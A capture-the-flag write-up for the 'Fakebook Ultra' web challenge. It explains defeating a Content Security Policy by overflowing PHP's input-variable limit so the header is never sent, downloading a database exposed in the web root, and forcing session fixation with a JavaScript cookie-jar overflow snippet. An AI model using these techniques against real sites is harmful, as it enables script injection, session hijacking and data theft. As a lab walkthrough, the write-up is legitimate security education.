# Fakebook Ultrta Solution

The code of this challenge is almost the same as [Fakebook Pro](../fakebook-pro), except for the addition of the Content Security Policy:
```php
// init.php:18
header("Content-Security-Policy: default-src 'none'; style-src 'self' 'unsafe-inline';");
```

If we send over 1000 Input variables like this: `f'{URL}/posts.php?username={urllib.parse.quote(username)}{'&a'*1000}'`, the subsequent headers, including the CSP header, will not be sent, allowing us to bypass the CSP.
```html
<br />
<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in <b>Unknown</b> on line <b>0</b><br />
<br />
<b>Warning</b>:  ini_set(): Session ini settings cannot be changed after headers have already been sent in <b>/var/www/html/init.php</b> on line <b>4</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/init.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/init.php</b> on line <b>12</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/init.php</b> on line <b>13</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/init.php</b> on line <b>14</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/init.php</b> on line <b>15</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/init.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  session_start(): Session cannot be started after headers have already been sent in <b>/var/www/html/init.php</b> on line <b>38</b><br />
```

Like the bot in [Fakebook Pro](../fakebook-pro), it does not have an Internet connection. We also do not have logout.php at this time.

Please note that the website stores its database in the web root, which allows us to directly download the database by sending a GET request to /users.db. 

Consequently, we can save the flag to the admin's post and later retrieve the flag from the database. (Refer to [solve.py](./solve.py) for details.)

There are two unexpected ways of retrieving data.
The first one is from Valiss:
https://discord.com/channels/1165255533490610249/1319285207202795550/1329495905325551708

> i did cookie jar overflow -> session fixation
```javascript
function cookieclear(){
     // Set many cookies
    for (let i = 0; i < 5000; i++) {
      document.cookie = `cookie${i}=${i};`
    }

    // Remove all cookies
    for (let i = 0; i < 5000; i++) {
      document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`
    }

    document.cookie = 'PHPSESSID=28f2059fa431018dbcbdb33939a18199'
    document.cookie = 'STAYINURLANE=true'
    return document.cookie
}
```

The second one is from maple. He used the bug in report.php and the fact that `cms` is not the same origin as `cms.`, to solve the logout problem.
https://blog.maple3142.net/2025/01/16/tscctf-2025-writeups/#fakebook-ultra

